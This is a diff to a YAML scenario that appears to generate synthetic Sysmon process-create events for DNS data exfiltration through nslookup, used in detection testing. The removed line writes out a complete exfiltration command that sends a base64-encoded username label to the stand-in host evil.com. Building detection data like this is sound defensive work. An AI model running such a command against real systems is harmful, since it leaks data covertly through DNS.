@@ -2,11 +2,11 @@ type: scenario
 description: |
   DNS data exfiltration via nslookup, as a Sysmon EID 1 (Process Create)
   event: nslookup.exe launched with a query-type flag (`-type`, `-querytype`,
-  `-qt`, `-q`) and a retry count, carrying a base64-encoded label to an
-  attacker-controlled domain that answers the lookups. Defaults to an A-record
-  lookup spawned by cmd.exe with output redirected to a temp file. Command line,
-  query metadata, integrity level, hashes, and parent command line are driven
-  from the job.
+  `-qt`, `-q`) carrying a base64-encoded label to an attacker-controlled domain
+  that answers the lookups. Defaults to an A-record lookup with a retry count,
+  spawned by cmd.exe with output redirected to a temp file. Command line and
+  parent command line are state parameters a job drives to exercise the
+  query-type variants.
 tags: [eid1]
 mitre:
   tactics: [exfiltration]
@@ -46,7 +46,7 @@ state:
   integrity_level:     High
   hashes:              "MD5=488698C899FE524430270C1D14FE99CF,SHA256=24553BFAB13871FAF3EE6F1F8EFECC5D25368A706A42CA35319228D3547418FA,IMPHASH=446F3F94B921C80C9E9497075AA3EF61"
   parent_image:        C:\Windows\System32\cmd.exe
-  parent_command_line: '"C:\Windows\system32\cmd.exe" /c nslookup.exe -timeout=5 -retry=3 -type=A VXNlck5hbWU6IEd1ZXN0 evil.com > C:\Users\ADMINI~1\AppData\Local\Temp\2\nlbfcqrg.tmp 2>&1'
+  parent_command_line: '"C:\Windows\system32\cmd.exe" /c nslookup.exe -timeout=5 -retry=3 -type=A ${ref.encoded_label} ${ref.exfil_domain} > C:\Users\${ref.username}\AppData\Local\Temp\2\nlbfcqrg.tmp 2>&1'
 
 steps:
   - emit:
